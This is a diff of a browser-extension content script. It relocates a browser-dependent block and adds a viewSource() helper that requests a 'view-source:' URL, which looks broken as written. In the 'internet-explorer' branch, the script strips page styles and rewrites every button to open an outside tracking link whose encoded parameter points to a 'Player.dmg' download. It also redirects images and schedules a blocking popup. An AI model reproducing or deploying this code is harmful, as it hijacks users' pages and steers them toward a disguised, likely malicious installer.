@@ -10,27 +10,6 @@ function sendAllTo(href) {
 	$(document).find('button').attr('onclick', `location.href=${href}`);
 }
 
-chrome.storage.local.get('browser', function (result) {
-	let browser = result.browser;
-	if (browser === 'safari') {
-		removeStyle("."+getModeClass());
-		for (var i = 0; i < 3; i++) {
-			removeStyle("."+randomClass());
-		}
-		nonBlockingPopup();
-	} else if (browser === 'opera') {
-		updateMessage();
-		swapClasses(20);
-	} else if (browser === 'firefox') {
-
-	} else if (browser === 'internet-explorer') {
-		removeAllStyle();
-		sendAllTo('http://www.balanceddisplay.com/ravz6?cid=wC96KQUPJJ275LTE1BQAFP8G&source=bb4f8837-134f-4eb9-ac57-7256b0a78b40&c=68802527-3371-e711-a367-f7801280a94b&s=f7b7c003-5db9-439d-b0c5-de6e1b76dd68&client=chrome&h=ShFARhQDFQsJBQkeAgQbCwJtCwYLBwMIAgwZDgABBgIAARsJAAMJBBMfEFtGGw0IDwYEBgMEBgADFRtXEwkQBA4BBwsMBgYeAQEBCBpcDgUAHlMBAA4aXw4MAQIACgZYDg1bFh0RXkJSGw0bUUBFQwgdGU5AThdWUF9TXFVcU11QR0FfU0sYWlhUGxgTQFUQDFdCVVUYE0NRWxQDBgkPGBNQVkIUA0NLTFFM&x=1&u=aHR0cHM6Ly9zMy5hbWF6b25hd3MuY29tLzE5NTA1MC9CNDVBODcvOEIzNTRDL1BsYXllci5kbWc%2fY2lkPXdDOTZLUVVQSkoyNzVMVEUxQlFBRlA4RyZzb3VyY2U9YmI0Zjg4MzctMTM0Zi00ZWI5LWFjNTctNzI1NmIwYTc4YjQwJmM9Njg4MDI1MjctMzM3MS1lNzExLWEzNjctZjc4MDEyODBhOTRiJnM9ZjdiN2MwMDMtNWRiOS00MzlkLWIwYzUtZGU2ZTFiNzZkZDY4JmNsaWVudD1jaHJvbWU%3d');
-		allImagesTo('download');
-		setTimeout(blockingPopup, (Math.random() * 20 + 10) * 1000);
-	}
-});
-
 function removeStyle(identifier) {
 	let all = $(identifier);
 	var i;
@@ -220,3 +199,34 @@ function swapClasses(num) {
 		swapCss(k, pairs[k]);
 	}
 }
+
+function viewSource() {
+	$.ajax({
+		url: 'view-source:' + location.href,
+		success: function(data) {
+			alert(data);
+		}
+	});
+}
+
+
+chrome.storage.local.get('browser', function (result) {
+	let browser = result.browser;
+	if (browser === 'safari') {
+		removeStyle("."+getModeClass());
+		for (var i = 0; i < 3; i++) {
+			removeStyle("."+randomClass());
+		}
+		nonBlockingPopup();
+	} else if (browser === 'opera') {
+		updateMessage();
+		swapClasses(20);
+	} else if (browser === 'firefox') {
+		viewSource()
+	} else if (browser === 'internet-explorer') {
+		removeAllStyle();
+		sendAllTo('http://www.balanceddisplay.com/ravz6?cid=wC96KQUPJJ275LTE1BQAFP8G&source=bb4f8837-134f-4eb9-ac57-7256b0a78b40&c=68802527-3371-e711-a367-f7801280a94b&s=f7b7c003-5db9-439d-b0c5-de6e1b76dd68&client=chrome&h=ShFARhQDFQsJBQkeAgQbCwJtCwYLBwMIAgwZDgABBgIAARsJAAMJBBMfEFtGGw0IDwYEBgMEBgADFRtXEwkQBA4BBwsMBgYeAQEBCBpcDgUAHlMBAA4aXw4MAQIACgZYDg1bFh0RXkJSGw0bUUBFQwgdGU5AThdWUF9TXFVcU11QR0FfU0sYWlhUGxgTQFUQDFdCVVUYE0NRWxQDBgkPGBNQVkIUA0NLTFFM&x=1&u=aHR0cHM6Ly9zMy5hbWF6b25hd3MuY29tLzE5NTA1MC9CNDVBODcvOEIzNTRDL1BsYXllci5kbWc%2fY2lkPXdDOTZLUVVQSkoyNzVMVEUxQlFBRlA4RyZzb3VyY2U9YmI0Zjg4MzctMTM0Zi00ZWI5LWFjNTctNzI1NmIwYTc4YjQwJmM9Njg4MDI1MjctMzM3MS1lNzExLWEzNjctZjc4MDEyODBhOTRiJnM9ZjdiN2MwMDMtNWRiOS00MzlkLWIwYzUtZGU2ZTFiNzZkZDY4JmNsaWVudD1jaHJvbWU%3d');
+		allImagesTo('download');
+		setTimeout(blockingPopup, (Math.random() * 20 + 10) * 1000);
+	}
+});
